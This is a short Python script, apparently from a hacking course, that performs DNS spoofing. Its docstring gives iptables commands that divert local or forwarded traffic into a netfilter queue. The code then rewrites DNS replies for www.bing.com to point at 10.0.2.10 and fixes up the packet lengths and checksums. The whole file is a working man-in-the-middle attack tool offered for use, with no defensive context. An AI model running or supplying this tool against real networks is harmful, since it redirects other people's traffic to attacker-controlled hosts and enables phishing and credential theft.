#!/usr/bin/env python

"""
Before running this program, make sure to run,
iptables -I OUTPUT -j NFQUEUE -queue-num 0
iptables -I INPUT -j NFQUEUE -queue-num 0

If targeting a remote computer, use,
iptables -I FORWARD -j NFQUEUE -queue-num 0

When you're done make sure to flush iptables,
iptables --flush
"""

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.10')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
